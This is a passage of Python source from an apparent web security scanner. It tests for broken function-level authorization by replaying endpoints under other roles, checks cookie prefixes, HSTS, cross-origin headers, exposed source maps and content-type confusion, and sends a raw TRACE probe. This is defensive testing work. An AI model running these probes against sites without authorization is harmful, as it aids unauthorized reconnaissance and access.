                #      role also has access.
                #
                # NOT BFLA:
                #   - A mid-tier role (Standard) has access but a lower-
                #     tier role (Limited) does not → proper tiered RBAC.
                #   - A path matches an admin keyword but ALL authenticated
                #     roles can access it → shared authenticated
                #     functionality (e.g. /Audit is a business function).
                _ep_path_lower = (ep.get("path") or "").lower()
                _is_admin_path = bool(re.search(
                    r'/admin(?![a-z])|/manage(?![a-z])|/config(?:uration)?(?![a-z])'
                    r'|/settings(?![a-z])|/users?/(?:admin|manage|create|delete)'
                    r'|/roles?(?![a-z])|/permissions?(?![a-z])'
                    r'|/internal(?![a-z])',
                    _ep_path_lower))
                _lower_roles_ok = []
                _lower_roles_denied = []
                for _lr in cred_roles:
                    if _lr == most_privileged:
                        continue
                    if _lr in _failed_auth_roles:
                        continue
                    if _ok(ep_access.get(_lr), _lr, ep):
                        _lower_roles_ok.append(_lr)
                    else:
                        _lower_roles_denied.append(_lr)
                # Skip when all lower roles have access and path is not
                # admin-typed — shared authenticated functionality.
                if _lower_roles_ok and not _lower_roles_denied and not _is_admin_path:
                    continue
                # For admin-keyword paths where ALL authenticated roles
                # have access: not a BFLA — the path is shared
                # authenticated functionality whose name happens to
                # match an admin keyword (e.g. /Audit is a business
                # domain, not an admin panel).
                if _is_admin_path and not _lower_roles_denied:
                    continue
                for low_role in _lower_roles_ok:
                    # ── Hierarchy filter ──────────────────────────────
                    # Only flag this role if a role with HIGHER privilege
                    # is denied.  Roles with LESS privilege being denied
                    # is expected in a tiered model (e.g. Standard >
                    # Limited means Standard SHOULD have more access).
                    #
                    # Peer-role threshold: roles whose privilege_counts
                    # are within 15% of each other are treated as peers
                    # (lateral roles with different permission shapes,
                    # e.g. Editor vs Auditor).  Neither being denied
                    # triggers BFLA for the other — they aren't in a
                    # hierarchical relationship.  Only roles with a
                    # meaningfully HIGHER count qualify as "higher
                    # privilege" evidence.
                    _lr_priv = privilege_counts.get(low_role, 0)
                    _peer_threshold = max(_lr_priv * 0.15, 1)
                    _higher_denied = [
                        d for d in _lower_roles_denied
                        if privilege_counts.get(d, 0) > _lr_priv + _peer_threshold
                    ]
                    if not _higher_denied and not _is_admin_path:
                        # Only lower-privilege or peer roles are denied
                        # — proper hierarchy / lateral permissions, not
                        # BFLA.
                        continue
                    # Build per-role access summary as evidence output
                    _bfla_lines = [f"URL: {ep['url']}"]
                    for _br in all_roles:
                        _bc = ep_access.get(_br, "N/A")
                        _bfla_lines.append(f"  {_br}: HTTP {_bc}")
                    if _higher_denied:
                        _bfla_lines.append(
                            f"Denied higher-privilege roles: "
                            f"{', '.join(_higher_denied)}")
                    _bfla_output = "\n".join(_bfla_lines)
                    # Save evidence file
                    _bfla_ev = ""
                    try:
                        _bfla_safe = re.sub(r'[^a-zA-Z0-9_.-]', '_',
                                            ep.get("path", ""))[:60]
                        _bfla_file = out.output_path(
                            phase, f"bfla_{low_role}_{_bfla_safe}")
                        _bfla_file.write_text(
                            f"BFLA Evidence\n{'='*50}\n{_bfla_output}",
                            encoding="utf-8")
                        _bfla_ev = str(_bfla_file)
                    except Exception:
                        pass
                    _bfla_risk = "HIGH" if _higher_denied else "MEDIUM"
                    _bfla_roles = sorted(set([low_role, most_privileged] +
                        [r for r in cred_roles if _ok(ep_access.get(r), r, ep)]))
                    out.add_finding(
                        title=f"BFLA: Role '{low_role}' Can Access Admin Path",
                        url=ep["url"], port=port, risk=_bfla_risk,
                        description=(
                            f"Role '{low_role}' can access {ep['path']} which "
                            f"is accessible to '{most_privileged}' (most "
                            f"privileged)"
                            + (f" but denied to {', '.join(_higher_denied)}"
                               f" (higher-privilege role{'s' if len(_higher_denied) > 1 else ''})"
                               if _higher_denied
                               else " and contains admin-specific functionality")
                            + ". This indicates broken function-level authorization."
                        ),
                        output=_bfla_output,
                        output_file=_bfla_ev,
                        command=f"GET {ep['url']} (role: {low_role})",
                        affected=ep["url"],
                        owasp="A01:2021 Broken Access Control", nist="AC-6",
                        remediation="Implement role-based access control (RBAC).",
                        roles=", ".join(_bfla_roles),
                    )

    # Build per-role auth status so consumers (Crucible, reviewers) can see
    # which roles actually authenticated vs which reflect unauthenticated access.
    _role_auth_status = {}
    for _r in all_roles:
        if _r == "unauthenticated":
            _role_auth_status[_r] = "unauthenticated"
        elif _r in _failed_auth_roles:
            _role_auth_status[_r] = "auth_failed"
        else:
            _role_auth_status[_r] = "authenticated"

    access_matrix_data = {
        "roles":            all_roles,
        "most_privileged":  most_privileged,
        "privilege_counts": privilege_counts,
        "auth_status":      _role_auth_status,
        "paths":            path_access,
    }
    try:
        (project_dir / "access_matrix.json").write_text(
            json.dumps(access_matrix_data, indent=2)
        )
        print(f"  access_matrix.json saved to {project_dir}/")
    except Exception as exc:
        vc.err(f"[access_matrix] Failed to save access_matrix.json: {exc}")

    vc.status(phase, "Access Matrix", "complete", "Done", len(crawled_paths), len(crawled_paths))
    vc.log("[access_matrix] Phase complete", "SUCCESS")
    return access_matrix_data


def _phase_bfla(target: dict, cfg: dict, pm: ProgressManager,
                out: OutputManager,
                role1_endpoints: list,
                ctx_sess: "requests.Session | None",
                ctx_label: str) -> None:
    """
    Phase 21: Broken Function Level Authorization (BFLA).

    Replays every HTTP 200 endpoint discovered during Role 1's scan using the
    current (lower-privilege or unauthenticated) role's session. Any endpoint
    that returns HTTP 200 for this role is a BFLA candidate: the server exposes
    a function that should be restricted to a higher-privilege role but fails to
    enforce that restriction.

    Risk assignment:
      CRITICAL — response body is identical to Role 1's (same data returned)
      HIGH     — response is 200 but body differs (function reached, different view)
    """
    phase   = "bfla"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    probe_sess = ctx_sess if ctx_sess is not None else requests.Session()
    total   = len(role1_endpoints)

    vc.status(phase, "BFLA Testing", "running", f"Testing {total} Role 1 endpoints", 0, total)
    vc.log(
        f"[bfla] Testing {total} Role 1 endpoints as [{ctx_label}]", "INFO")

    # Collect all accessible endpoints first, then emit one merged finding per
    # risk tier so that all affected relative URLs are consolidated into a single
    # finding rather than producing one finding per endpoint.
    _bfla_critical: list = []   # body-identical to Role 1
    _bfla_high:     list = []   # HTTP 200 but body differs

    for idx, ep in enumerate(role1_endpoints):
        ep_url = ep["url"]
        vc.status(phase, "BFLA Testing", "running",
                  f"Endpoint {idx+1}/{total}", idx + 1, total)
        try:
            r = probe_sess.get(ep_url, timeout=timeout, allow_redirects=False)
        except Exception:
            continue

        if r.status_code != 200:
            continue

        # Skip SPA login shells / login pages — 200 on a login path
        # is not privilege escalation (the page is public).
        _bfla_rel = urllib.parse.urlparse(ep_url).path or "/"
        if _P20_LOGIN_PATH_RE.search(_bfla_rel):
            continue
        _bfla_body = (r.text or "")[:8000]
        if _P20_LOGIN_FORM_RE.search(_bfla_body):
            continue
        # Skip error/catch-all pages — custom error pages (e.g.
        # ErrorPage.aspx) return 200 to all roles and are not
        # real protected content.
        if _response_is_error_page(_bfla_body, _bfla_rel):
            continue
        if _matches_error_fingerprint(_bfla_body):
            continue

        body_hash  = hash(r.text[:4096])
        body_match = (body_hash == ep.get("body_hash")) and (
            abs(len(r.text) - ep.get("body_len", 0)) < 64)
        bucket = _bfla_critical if body_match else _bfla_high
        bucket.append({
            "ep":    ep,
            "url":   ep_url,
            "r_len": len(r.text),
            "r_status": r.status_code,
        })
        tier = "CRITICAL" if body_match else "HIGH"
        vc.log(f"[bfla] BFLA {tier}: {ep_url} accessible as [{ctx_label}]", "SUCCESS")

    def _emit_bfla_tier(hits: list, risk: str, match_note: str) -> None:
        if not hits:
            return
        role1_label = hits[0]["ep"]["role1_label"]
        affected_urls = "\n".join(h["url"] for h in hits)
        output_lines  = [
            f"  {h['url']}  |  Role 1 ({role1_label}): HTTP {h['ep']['status']} "
            f"({h['ep'].get('body_len', '?')} bytes)  |  "
            f"Role ({ctx_label}): HTTP {h['r_status']} ({h['r_len']} bytes)"
            for h in hits
        ]
        _bfla_ev = ""
        try:
            _bfla_path = out.output_path("auth_walk",
                f"bfla_{risk.lower()}_{ctx_label}")
            _bfla_path.write_text(
                f"BFLA Evidence — {risk}\n"
                f"Testing role: {ctx_label}\n"
                f"Reference role: {role1_label}\n"
                f"Endpoints:\n" + "\n".join(output_lines),
                encoding="utf-8")
            _bfla_ev = str(_bfla_path)
        except Exception:
            pass
        out.add_finding(
            title="Broken Function Level Authorization (BFLA)",
            url=target["url"],
            port=target["port"],
            risk=risk,
            description=(
                f"Role '{ctx_label}' successfully accessed {len(hits)} endpoint(s) "
                f"that returned HTTP 200 for the most privileged role "
                f"('{role1_label}'). The server did not enforce role-level access "
                f"control on these functions. {match_note}"
            ),
            output="\n".join(output_lines),
            sources="fracture-bfla",
            service=target["scheme"],
            output_file=_bfla_ev,
            affected=affected_urls,
            owasp="A01:2025 Broken Access Control",
            nist="AC-3",
            remediation=(
                "Implement server-side function-level access control checks for every "
                "endpoint. Verify the authenticated identity's role before executing "
                "privileged operations — do not rely solely on hiding URLs or UI elements."
            ),
            roles=", ".join(sorted(set([ctx_label, role1_label]))),
        )

    _emit_bfla_tier(
        _bfla_critical, "CRITICAL",
        "Response body is identical to Role 1's response — the same data "
        "is returned regardless of privilege level.",
    )
    _emit_bfla_tier(
        _bfla_high, "HIGH",
        "Response was HTTP 200 but body differs from Role 1's — the function "
        "endpoint is reachable; data may be scoped differently.",
    )

    findings_count = len(_bfla_critical) + len(_bfla_high)
    vc.status(phase, "BFLA Testing", "complete", "Done", total, total)
    vc.log(
        f"[bfla] Phase complete — {findings_count} accessible endpoint(s) "
        f"({len(_bfla_critical)} CRITICAL, {len(_bfla_high)} HIGH) for [{ctx_label}]",
        "SUCCESS")


# Privileged-path keywords used when scoring role access depth.
_PRIV_PATH_RE = re.compile(
    r'admin|config|manage|settings|dashboard|users|accounts|reports|'
    r'billing|finance|audit|internal|deploy|security|api/admin|api/v\d+/admin|'
    r'superuser|staff|operator|moderator|panel|control',
    re.I,
)
# Patterns that indicate access denial in a 200 response body.
# Checked in the page <title> first (lower false-positive rate) then body text.
_DENIAL_RE = re.compile(
    r'<title[^>]*>[^<]*(?:access\s+denied|403|forbidden|unauthorized|not\s+authorized)[^<]*</title'
    r'|'
    r'\b(access\s+denied|403\s+forbidden|401\s+unauthorized|permission\s+denied|'
    r'not\s+authorized|unauthorized\s+access|login\s+required|'
    r'sign[\s\-]?in\s+required|'
    r'you\s+(?:don\'?t|do\s+not)\s+have\s+(?:permission|access))\b',
    re.IGNORECASE,
)
# Score threshold: a new role must beat the current discovery leader by this
# factor before its busting results are considered more authoritative.
_DISCOVERY_RESCORE_THRESHOLD = 1.15


# =============================================================================
# Gap Coverage Tests — v2.42.0
# =============================================================================
# 22 new security tests covering: WebSocket, source maps, cache deception,
# OAuth/OIDC, prototype pollution, h2c smuggling, verb tunneling, MFA bypass,
# cookie prefixes, HSTS preload, COOP/COEP/CORP, SSI/ESI injection, email
# header injection, unicode normalization, CSRF advanced, TRACE/XST,
# content-type confusion, password policy, API rate limiting, GraphQL advanced.
# =============================================================================


# ── Group A: Header & Recon Extensions ──────────────────────────────────
# ─────────────────────────────────────────────
# Gap Group A: Header / Recon / Misc Extensions
# ─────────────────────────────────────────────
# These functions are meant to be inserted into fracture.py and called
# from the appropriate phase dispatch blocks.


def _test_cookie_prefixes(target: dict, cfg: dict, out: "OutputManager",
                          sess: "requests.Session") -> None:
    """Check __Host- and __Secure- cookie prefix rules (RFC 6265bis §4.1.3).

    __Host- cookies MUST have Secure, Path=/, and no Domain attribute.
    __Secure- cookies MUST have the Secure attribute.
    """
    phase   = "headers"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)

    try:
        r = sess.get(url, timeout=timeout, allow_redirects=True)
    except Exception:
        return

    _rq, _rp = None, None
    try:
        _rq, _rp = _save_http_evidence(out, phase, "cookie_prefix_check", r)
    except Exception:
        pass
    _ev = f"{_rq},{_rp}" if _rq else ""

    # requests CaseInsensitiveDict keeps only the last value per header;
    # use raw headers to get every Set-Cookie line.
    _sc_raw: list = []
    if hasattr(r, "raw") and hasattr(r.raw, "headers"):
        _sc_raw = r.raw.headers.getlist("Set-Cookie")
    if not _sc_raw:
        _v = r.headers.get("Set-Cookie", "")
        if _v:
            _sc_raw = [_v]

    for raw in _sc_raw:
        if not raw:
            continue
        parts = raw.split(";")
        if not parts:
            continue
        name_val = parts[0].strip()
        cname = name_val.split("=", 1)[0].strip()
        attrs_lower = raw.lower()

        if cname.startswith("__Host-"):
            violations = []
            if "secure" not in attrs_lower:
                violations.append("missing Secure flag")
            # Must have Path=/
            _path_match = re.search(r'path\s*=\s*([^\s;,]+)', attrs_lower)
            if not _path_match or _path_match.group(1).strip() != "/":
                violations.append("Path is not exactly '/'")
            # Must NOT have Domain
            if "domain=" in attrs_lower or "domain =" in attrs_lower:
                violations.append("Domain attribute is set (forbidden for __Host-)")
            if violations:
                out.add_finding(
                    title=f"Cookie Prefix Violation: __Host-{cname[7:]}",
                    url=url, port=target["port"], risk="MEDIUM",
                    description=(
                        f"Cookie '{cname}' uses the __Host- prefix but violates "
                        f"the prefix rules: {'; '.join(violations)}. Browsers that "
                        f"enforce RFC 6265bis will reject or ignore this cookie, and "
                        f"browsers that do not enforce it lose the security guarantees "
                        f"the prefix is designed to provide (origin isolation, no "
                        f"domain-scope widening)."
                    ),
                    output=f"Set-Cookie: {raw[:300]}\nViolations: {'; '.join(violations)}",
                    output_file=_ev,
                    sources="fracture-cookie-prefix", service=target["scheme"],
                    affected=url,
                    owasp="A05:2025 Security Misconfiguration", nist="SC-23",
                    cvss_score=4.3,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
                    cwe=["CWE-614"],
                    remediation=(
                        "Ensure __Host- cookies are set with Secure; Path=/; and "
                        "without a Domain attribute. If the cookie must be scoped to "
                        "a specific path or shared across subdomains, use __Secure- "
                        "instead."
                    ),
                )
                vc.log(f"[headers] __Host- prefix violation: {cname}", "SUCCESS")

        elif cname.startswith("__Secure-"):
            if "secure" not in attrs_lower:
                out.add_finding(
                    title=f"Cookie Prefix Violation: __Secure-{cname[9:]}",
                    url=url, port=target["port"], risk="MEDIUM",
                    description=(
                        f"Cookie '{cname}' uses the __Secure- prefix but is missing "
                        f"the Secure attribute. Browsers enforcing RFC 6265bis will "
                        f"reject this cookie. Without the Secure flag the cookie can "
                        f"be sent over cleartext HTTP, defeating the purpose of the prefix."
                    ),
                    output=f"Set-Cookie: {raw[:300]}\nViolation: missing Secure flag",
                    output_file=_ev,
                    sources="fracture-cookie-prefix", service=target["scheme"],
                    affected=url,
                    owasp="A05:2025 Security Misconfiguration", nist="SC-23",
                    cvss_score=4.3,
                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N",
                    cwe=["CWE-614"],
                    remediation=(
                        "Add the Secure attribute to all __Secure- prefixed cookies."
                    ),
                )
                vc.log(f"[headers] __Secure- prefix violation: {cname}", "SUCCESS")


def _test_hsts_preload(target: dict, cfg: dict, out: "OutputManager",
                       sess: "requests.Session") -> None:
    """Check if HSTS header is preload-ready (includeSubDomains + preload + max-age >= 1y)."""
    phase   = "headers"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)

    if not target.get("is_https"):
        return

    try:
        r = sess.get(url, timeout=timeout, allow_redirects=True)
    except Exception:
        return

    hsts = r.headers.get("Strict-Transport-Security", "")
    if not hsts:
        return  # Missing HSTS is already reported by the main headers phase

    hsts_lower = hsts.lower()
    issues = []

    # Check max-age
    _ma_match = re.search(r'max-age\s*=\s*(\d+)', hsts_lower)
    if _ma_match:
        max_age = int(_ma_match.group(1))
        if max_age < 31536000:
            issues.append(f"max-age={max_age} (must be >= 31536000 for preload)")
    else:
        issues.append("max-age directive missing")

    if "includesubdomains" not in hsts_lower:
        issues.append("includeSubDomains directive missing")

    if "preload" not in hsts_lower:
        issues.append("preload directive missing")

    if issues:
        _hsts_ev = ""
        try:
            _hsts_rq, _hsts_rp = _save_http_evidence(
                out, phase, f"hsts_preload_{target['hostname']}", r)
            _hsts_ev = json.dumps(
                [{"url": url, "req": str(_hsts_rq), "resp": str(_hsts_rp)}])
        except Exception:
            pass
        out.add_finding(
            title="HSTS Not Preload-Ready",
            url=url, port=target["port"], risk="LOW",
            description=(
                f"The Strict-Transport-Security header is present but does not "
                f"meet the requirements for HSTS preload list inclusion. The HSTS "
                f"preload list is built into browsers and forces HTTPS for the domain "
                f"even on the first visit, preventing SSL-stripping attacks. Issues: "
                f"{'; '.join(issues)}."
            ),
            output=f"Strict-Transport-Security: {hsts}\nIssues: {'; '.join(issues)}",
            sources="fracture-hsts-preload", service=target["scheme"],
            output_file=_hsts_ev,
            affected=url,
            owasp="A05:2025 Security Misconfiguration", nist="SC-8",
            cwe=["CWE-523"],
            remediation=(
                "Set the HSTS header to: Strict-Transport-Security: "
                "max-age=63072000; includeSubDomains; preload — then submit "
                "the domain to hstspreload.org. Verify all subdomains support "
                "HTTPS before enabling includeSubDomains."
            ),
        )
        vc.log("[headers] HSTS not preload-ready", "SUCCESS")


def _test_coop_coep_corp(target: dict, cfg: dict, out: "OutputManager",
                         sess: "requests.Session") -> None:
    """Check for missing Cross-Origin isolation headers (COOP, COEP, CORP)."""
    phase   = "headers"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)

    try:
        r = sess.get(url, timeout=timeout, allow_redirects=True)
    except Exception:
        return

    _headers_to_check = [
        (
            "Cross-Origin-Opener-Policy",
            "COOP",
            "Controls which cross-origin documents can share a browsing context group "
            "with the page. Without COOP, cross-origin popups opened by the page (or "
            "that open the page) can access each other's window objects, enabling "
            "Spectre-class side-channel attacks and cross-origin data leaks.",
            "Set the Cross-Origin-Opener-Policy header to 'same-origin' to isolate "
            "the browsing context. Use 'same-origin-allow-popups' if the page must "
            "communicate with cross-origin popups it opens.",
        ),
        (
            "Cross-Origin-Embedder-Policy",
            "COEP",
            "Controls whether the page can load cross-origin resources that have not "
            "opted in via CORS or CORP. Without COEP, cross-origin resources loaded "
            "into the page can be exploited via Spectre-class side-channel attacks. "
            "COEP is required together with COOP to enable cross-origin isolation "
            "(SharedArrayBuffer, high-resolution timers).",
            "Set the Cross-Origin-Embedder-Policy header to 'require-corp' or "
            "'credentialless'. Ensure all embedded cross-origin resources serve "
            "appropriate CORP or CORS headers.",
        ),
        (
            "Cross-Origin-Resource-Policy",
            "CORP",
            "Controls which origins can embed this resource. Without CORP, any "
            "cross-origin page can embed the resource (e.g. in an <img>, <script>, "
            "or <iframe>), enabling data exfiltration via Spectre-class side-channel "
            "attacks on the embedding page.",
            "Set the Cross-Origin-Resource-Policy header to 'same-origin' for "
            "resources that should only be loaded by the same origin, or "
            "'same-site' for same-site loading. Use 'cross-origin' only for "
            "genuinely public resources.",
        ),
    ]

    _coi_ev = ""
    try:
        _coi_rq, _coi_rp = _save_http_evidence(
            out, phase, f"cross_origin_headers_{target['hostname']}", r)
        _coi_ev = json.dumps(
            [{"url": url, "req": str(_coi_rq), "resp": str(_coi_rp)}])
    except Exception:
        pass

    for hdr_name, short, desc, remed in _headers_to_check:
        if hdr_name not in r.headers:
            out.add_finding(
                title=f"Missing Security Header: {hdr_name}",
                url=url, port=target["port"], risk="INFO",
                description=f"The {hdr_name} ({short}) header is not set. {desc}",
                output=f"Response headers do not include {hdr_name}.",
                sources="fracture-cross-origin-headers", service=target["scheme"],
                output_file=_coi_ev,
                affected=url,
                owasp="A05:2025 Security Misconfiguration", nist="SC-7",
                cwe=["CWE-346"],
                remediation=remed,
            )
            vc.log(f"[headers] Missing {short}: {hdr_name}", "INFO")


def _test_source_maps(target: dict, cfg: dict, out: "OutputManager",
                      sess: "requests.Session",
                      crawl_data: dict = None) -> None:
    """Check for exposed JavaScript source map files (.js.map).

    Source maps contain the original, un-minified source code including comments,
    variable names, internal API endpoints, and potentially secrets.
    """
    phase   = "recon"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)
    vc.status(phase, "Source Maps", "running", "Checking for .js.map files", 0, 1)

    # Collect JS URLs from crawl data and page content
    js_urls: set = set()

    # From crawl_data links
    if crawl_data:
        for link in crawl_data.get("links", []):
            if isinstance(link, str) and link.endswith(".js"):
                js_urls.add(link)
            elif isinstance(link, dict) and str(link.get("url", "")).endswith(".js"):
                js_urls.add(link["url"])

    # Fetch the base page and extract <script src="..."> tags
    try:
        r = sess.get(url, timeout=timeout, allow_redirects=True)
        for m in re.finditer(r'<script\b[^>]+\bsrc=["\']([^"\']+\.js)["\']',
                             r.text, re.IGNORECASE):
            src = m.group(1)
            if src.startswith("//"):
                src = target["scheme"] + ":" + src
            elif src.startswith("/"):
                src = f"{target['scheme']}://{target['hostname']}:{target['port']}{src}"
            elif not src.startswith("http"):
                src = urllib.parse.urljoin(url, src)
            js_urls.add(src)
    except Exception:
        pass

    # Only check same-origin JS files, cap at 20
    _same_origin = target["hostname"].lower()
    js_urls = [
        u for u in js_urls
        if urllib.parse.urlparse(u).hostname and
        urllib.parse.urlparse(u).hostname.lower() == _same_origin
    ][:20]

    _found: set = set()
    for js_url in js_urls:
        if js_url in _found:
            continue
        map_url = js_url + ".map"
        try:
            r = sess.get(map_url, timeout=timeout, allow_redirects=False)
            # Valid source maps are JSON with "version" and "sources" keys
            if r.status_code == 200 and r.headers.get("Content-Type", "").startswith(
                ("application/json", "application/octet-stream", "text/plain")
            ):
                body = r.text[:2000]
                if '"version"' in body and '"sources"' in body:
                    _found.add(js_url)
                    _rq, _rp = _save_http_evidence(out, phase, f"sourcemap_{js_url.split('/')[-1][:40]}", r)
                    # Count source files exposed
                    _src_count = body.count('"sources"')
                    try:
                        _map_data = r.json()
                        _src_count = len(_map_data.get("sources", []))
                    except Exception:
                        pass
                    out.add_finding(
                        title="JavaScript Source Map Exposed",
                        url=map_url, port=target["port"], risk="MEDIUM",
                        description=(
                            f"A JavaScript source map file is publicly accessible at "
                            f"{map_url}. Source maps contain the original un-minified "
                            f"source code, including comments, internal API routes, "
                            f"configuration values, and potentially embedded secrets. "
                            f"This file exposes approximately {_src_count} source "
                            f"file(s) from the build."
                        ),
                        output=f"URL: {map_url}\nHTTP {r.status_code}\nSources: ~{_src_count} files\nPreview: {body[:500]}",
                        output_file=f"{_rq},{_rp}",
                        sources="fracture-source-maps", service=target["scheme"],
                        affected=js_url,
                        owasp="A05:2025 Security Misconfiguration", nist="SC-28",
                        cvss_score=5.3,
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                        cwe=["CWE-540"],
                        remediation=(
                            "Remove source map files from production deployments. Configure "
                            "the build pipeline to either not generate source maps for "
                            "production builds, or to upload them to a private error-tracking "
                            "service (e.g. Sentry). Remove //# sourceMappingURL comments from "
                            "production JS files."
                        ),
                    )
                    vc.log(f"[recon] Source map exposed: {map_url}", "SUCCESS")
        except Exception:
            pass

        # Also check for sourceMappingURL in the JS file itself
        if js_url not in _found:
            try:
                r_js = sess.get(js_url, timeout=timeout, allow_redirects=True)
                if r_js.status_code == 200:
                    # Check last 500 bytes for the comment
                    tail = r_js.text[-500:] if len(r_js.text) > 500 else r_js.text
                    _sm_match = re.search(
                        r'//[#@]\s*sourceMappingURL\s*=\s*(\S+)', tail)
                    if _sm_match:
                        _sm_url = _sm_match.group(1).strip()
                        if _sm_url.startswith("data:"):
                            # Inline source map — entire source embedded in the JS file
                            _found.add(js_url)
                            _ism_ev = ""
                            try:
                                _ism_safe = re.sub(r'[^a-zA-Z0-9_-]', '_', js_url)[:50]
                                _ism_rq, _ism_rp = _save_http_evidence(
                                    out, phase, f"inline_srcmap_{_ism_safe}", r_js)
                                _ism_ev = json.dumps(
                                    [{"url": js_url, "req": str(_ism_rq), "resp": str(_ism_rp)}])
                            except Exception:
                                pass
                            out.add_finding(
                                title="Inline Source Map in JavaScript Bundle",
                                url=js_url, port=target["port"], risk="MEDIUM",
                                description=(
                                    f"The JavaScript file at {js_url} contains an inline "
                                    f"source map (data: URI in sourceMappingURL). This "
                                    f"embeds the complete original source code directly "
                                    f"in the production bundle."
                                ),
                                output=f"URL: {js_url}\nsourceMappingURL=data:... (inline)",
                                sources="fracture-source-maps", service=target["scheme"],
                                output_file=_ism_ev,
                                affected=js_url,
                                owasp="A05:2025 Security Misconfiguration", nist="SC-28",
                                cvss_score=5.3,
                                cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                                cwe=["CWE-540"],
                                remediation=(
                                    "Configure the build tool to disable inline source maps "
                                    "in production. Use devtool: false (webpack), "
                                    "sourcemap: false (Vite/Rollup), or equivalent."
                                ),
                            )
                            vc.log(f"[recon] Inline source map: {js_url}", "SUCCESS")
            except Exception:
                pass

    vc.status(phase, "Source Maps", "complete", f"Checked {len(js_urls)} JS files", 1, 1)
    vc.log(f"[recon] Source map check complete — {len(_found)} exposed", "SUCCESS")


def _test_content_type_confusion(target: dict, cfg: dict, out: "OutputManager",
                                 sess: "requests.Session") -> None:
    """Test for content-type confusion / MIME sniffing vulnerabilities."""
    phase   = "headers"
    url     = target["url"]
    timeout = cfg.get("timeout", 10)

    # Test 1: Request the base URL with a mismatched Accept header
    _tests = [
        # (accept_header, expected_ct_prefix, description)
        ("application/json", "text/html", "HTML page served as JSON when requested"),
        ("text/css", "text/html", "HTML page served as CSS when requested"),
    ]

    for accept_val, normal_ct, desc_note in _tests:
        try:
            r = sess.get(url, timeout=timeout, allow_redirects=True,
                         headers={"Accept": accept_val})
            resp_ct = r.headers.get("Content-Type", "").split(";")[0].strip().lower()
            # If the server changed its Content-Type to match our Accept header
            # AND the body is still HTML, that's a content-type confusion
            if (resp_ct == accept_val.lower()
                    and "<html" in r.text[:2000].lower()
                    and "x-content-type-options" not in
                    {k.lower() for k in r.headers}):
                _rq, _rp = _save_http_evidence(out, phase, f"ct_confusion_{accept_val.replace('/', '_')}", r)
                out.add_finding(
                    title="Content-Type Confusion",
                    url=url, port=target["port"], risk="LOW",
                    description=(
                        f"The server returned HTML content with Content-Type "
                        f"'{resp_ct}' when the request specified Accept: {accept_val}. "
                        f"Combined with the absence of X-Content-Type-Options: nosniff, "
                        f"this allows browsers to MIME-sniff the response, potentially "
                        f"enabling XSS via content injection in contexts where the "
                        f"declared content-type would otherwise prevent script execution."
                    ),
                    output=(
                        f"Request Accept: {accept_val}\n"
                        f"Response Content-Type: {resp_ct}\n"
                        f"X-Content-Type-Options: (not set)\n"
                        f"Body contains HTML: yes"
                    ),
                    output_file=f"{_rq},{_rp}",
                    sources="fracture-content-type-confusion", service=target["scheme"],
                    affected=url,
                    owasp="A05:2025 Security Misconfiguration", nist="SI-10",
                    cwe=["CWE-430"],
                    remediation=(
                        "Always set X-Content-Type-Options: nosniff to prevent MIME "
                        "sniffing. Ensure the Content-Type header accurately reflects "
                        "the response body regardless of the Accept request header."
                    ),
                )
                vc.log(f"[headers] Content-Type confusion: {url} served HTML as {resp_ct}", "SUCCESS")
                break  # One finding is enough
        except Exception:
            pass


def _test_trace_xst(target: dict, cfg: dict, out: "OutputManager",
                    sess: "requests.Session") -> None:
    """Test TRACE method for Cross-Site Tracing (XST).

    Uses a raw socket because the requests library does not natively support
    the TRACE HTTP method and some adapters block it.
    """
    import socket as _sock, ssl as _ssl2, select as _sel2

    phase    = "headers"
    url      = target["url"]
    hostname = target["hostname"]
    port     = target["port"]
    scheme   = target["scheme"]
    timeout  = cfg.get("timeout", 10)
    use_tls  = scheme == "https"
    parsed   = urllib.parse.urlparse(url)
    path     = parsed.path or "/"

    try:
        sock = _sock.create_connection((hostname, port), timeout=timeout)
        sock.settimeout(None)
        if use_tls:
            ctx = _ssl2.create_default_context()
            if not cfg.get("verify_ssl", False):
                ctx.check_hostname = False
                ctx.verify_mode = _ssl2.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=hostname)

        # Send TRACE request with a canary header
        _canary = f"X-Fracture-Trace-Canary: trace-test-{int(time.time())}"
        req = (
            f"TRACE {path} HTTP/1.1\r\n"
            f"Host: {hostname}\r\n"
            f"{_canary}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )
        sock.sendall(req.encode())

        # Read response
        buf = b""
        deadline = time.time() + timeout
        while time.time() < deadline:
            rem = max(deadline - time.time(), 0.05)
            ready = _sel2.select([sock], [], [], min(rem, 1.0))
            if not ready[0]:
                if buf:
                    break
                continue
            try:
                chunk = sock.recv(8192)
            except (_sock.error, _ssl2.SSLError, OSError):
                break
            if not chunk:
                break
            buf += chunk
            if b"\r\n\r\n" in buf and len(buf) > 200:
                break

        sock.close()

        resp = buf.decode("utf-8", errors="replace")

        # Check if server returned 200 and reflected our headers
        _status_line = resp.split("\r\n")[0] if resp else ""
        try:
            _code = int(_status_line.split()[1])
        except (IndexError, ValueError):
            _code = 0

        if _code == 200 and _canary.lower() in resp.lower():
            # TRACE is enabled and reflects headers — XST vulnerability
            _ev_path = out.output_path(phase, "trace_xst_response")
            _ev_path.write_text(resp[:4000], encoding="utf-8")
            out.add_finding(
                title="HTTP TRACE Method Enabled (Cross-Site Tracing)",
                url=url, port=target["port"], risk="MEDIUM",
                description=(
                    "The web server has the HTTP TRACE method enabled and reflects "
                    "request headers (including authentication cookies and tokens) "
                    "in the response body. An attacker who can induce a victim's browser "
                    "to send a TRACE request (via XSS or a misconfigured CORS policy) "
                    "can steal HttpOnly cookies and Authorization headers that are "
                    "normally inaccessible to JavaScript."
                ),
                output=(
                    f"TRACE {path} HTTP/1.1\n"
                    f"Response: HTTP {_code}\n"
                    f"Canary reflected: {_canary}\n"
                    f"Response body (first 500 chars):\n{resp[:500]}"
                ),
                output_file=str(_ev_path),
                sources="fracture-trace-xst", service=target["scheme"],
                affected=url,
                owasp="A05:2025 Security Misconfiguration", nist="CM-7",
